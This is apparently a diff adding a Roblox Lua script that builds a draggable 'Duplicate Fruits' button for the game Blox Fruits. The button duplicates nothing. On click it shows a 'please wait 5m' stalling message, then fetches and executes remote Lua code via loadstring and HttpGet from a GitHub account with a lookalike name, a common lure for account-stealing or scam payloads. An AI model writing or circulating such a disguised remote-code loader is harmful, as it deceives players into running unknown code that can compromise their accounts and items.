@@ -1,1 +1,48 @@
+-- Create the Screen GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.Name = "DuplicateFruitGUI"
 
+-- Main Frame (Movable Smooth Corner Box)
+local MainFrame = Instance.new("Frame")
+MainFrame.Parent = ScreenGui
+MainFrame.Size = UDim2.new(0, 250, 0, 150)
+MainFrame.Position = UDim2.new(0.5, -125, 0.5, -75)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+MainFrame.Active = true
+MainFrame.Draggable = true -- Make it movable
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0.1, 0) -- Smooth corners
+UICorner.Parent = MainFrame
+
+-- Duplicate Button
+local DuplicateButton = Instance.new("TextButton")
+DuplicateButton.Parent = MainFrame
+DuplicateButton.Size = UDim2.new(0, 200, 0, 50)
+DuplicateButton.Position = UDim2.new(0.5, -100, 0.5, -25)
+DuplicateButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+DuplicateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+DuplicateButton.Text = "Duplicate Fruits"
+DuplicateButton.Font = Enum.Font.SourceSansBold
+DuplicateButton.TextSize = 18
+
+local ButtonCorner = Instance.new("UICorner")
+ButtonCorner.CornerRadius = UDim.new(0.1, 0)
+ButtonCorner.Parent = DuplicateButton
+
+-- Duplicate Button Functionality
+DuplicateButton.MouseButton1Click:Connect(function()
+    -- Change button text to the original message
+    DuplicateButton.Text = "please wait 5m so you can keep the fruits"
+    
+    -- Load and execute the external script
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/reaIredz/BloxFruits/refs/heads/main/refs/heads/main/Source.lua"))()
+    end)
+
+    if not success then
+        warn("Failed to load the script: " .. err)
+    end
+end)
